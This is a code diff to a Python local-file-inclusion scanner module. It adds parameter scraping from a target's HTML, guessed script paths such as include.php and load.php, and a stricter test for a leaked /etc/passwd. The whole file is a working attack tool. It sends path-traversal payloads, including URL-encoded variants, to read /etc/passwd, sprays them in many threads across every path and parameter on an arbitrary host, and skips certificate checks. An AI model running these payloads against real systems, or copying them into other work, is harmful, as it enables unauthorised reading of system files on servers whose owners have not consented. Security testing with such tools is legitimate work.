@@ -1,13 +1,16 @@
 import requests
 import os
+import re
 from concurrent.futures import ThreadPoolExecutor, as_completed
+from bs4 import BeautifulSoup
 from config import HTTP_HEADERS, DEFAULT_TIMEOUT
 from module.other import Other
 
 class LFIScanner:
     def __init__(self, args):
         self.target = args.target
-        self.thread = args.threads
+        self.threads = args.threads
+        self.verbose = args.verbose
         self.payloads = [
             "../../../../etc/passwd",
             "../../../etc/passwd",
@@ -23,36 +26,66 @@ class LFIScanner:
             "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
             "%2e%2e\\%2e%2e\\%2e%2e\\etc\\passwd"
         ]
+        self.common_params = ["file", "path", "page", "doc", "url", "template"]
+        self.guess_paths = [
+            "", "view", "include", "page", "show", "load", "download", "preview",
+            "view.php", "include.php", "page.php", "show.php", "load.php",
+            "index.php", "main.php"
+        ]
         self.module_name = os.path.splitext(os.path.basename(__file__))[0]
         self.printer = Other()
+
+    def extract_params_from_dom(self):
+        found = set()
+        for proto in ["http", "https"]:
+            try:
+                url = f"{proto}://{self.target}"
+                r = requests.get(url, headers=HTTP_HEADERS, timeout=DEFAULT_TIMEOUT, verify=False)
+                soup = BeautifulSoup(r.text, "html.parser")
+                for tag in soup.find_all(["a", "form", "script"]):
+                    attr = tag.get("href") or tag.get("action") or tag.string or ""
+                    found.update(re.findall(r"[?&]([a-zA-Z0-9_-]+)=", attr))
+            except:
+                continue
+        return list(found.union(set(self.common_params)))
+
+    def is_valid_passwd(self, text):
+        if "root:x" in text and "nologin" in text:
+            lines = text.split()
+            return sum(1 for ln in lines if re.match(r"^[a-zA-Z0-9_-]+:x?:[0-9]+:[0-9]+:", ln)) >= 3
+        return False
 
     def check_payload(self, url):
         try:
             r = requests.get(url, headers=HTTP_HEADERS, timeout=DEFAULT_TIMEOUT, verify=False)
-            colored_url = self.printer.color_text(result, "yellow")
-            print(f"[*] [Module: {colored_module}] [Detected: LFI] [URL: {colored_url}]")
-
-            if "root:x" in r.text:
+            if self.is_valid_passwd(r.text):
                 return url
+            if self.verbose:
+                print(f"[-] Checked: {url}")
         except:
-            return None
+            pass
         return None
 
     def run(self):
         colored_module = self.printer.color_text(self.module_name, "cyan")
-        protocols = ["http", "https"]
+        params = self.extract_params_from_dom()
         tasks = []
 
-        with ThreadPoolExecutor(max_workers=self.thread) as executor:
-            for proto in protocols:
-                for payload in self.payloads:
-                    url = f"{proto}://{self.target}/?file={payload}"
-                    tasks.append(executor.submit(self.check_payload, url))
+        with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            for proto in ["http", "https"]:
+                for path in self.guess_paths:
+                    base = f"{proto}://{self.target}"
+                    if path:
+                        base += f"/{path}"
+                    for param in params:
+                        for payload in self.payloads:
+                            tasks.append(executor.submit(self.check_payload, f"{base}?{param}={payload}"))
 
-            results = []
             for future in as_completed(tasks):
                 result = future.result()
                 if result:
+                    colored_url = self.printer.color_text(result, "yellow")
+                    print(f"[*] [Module: {colored_module}] [LFI Detected] [URL: {colored_url}]")
                     return [{"vulnerable": True, "payload": result}]
 
         print(f"[*] [Module: {colored_module}] No LFI detected.")
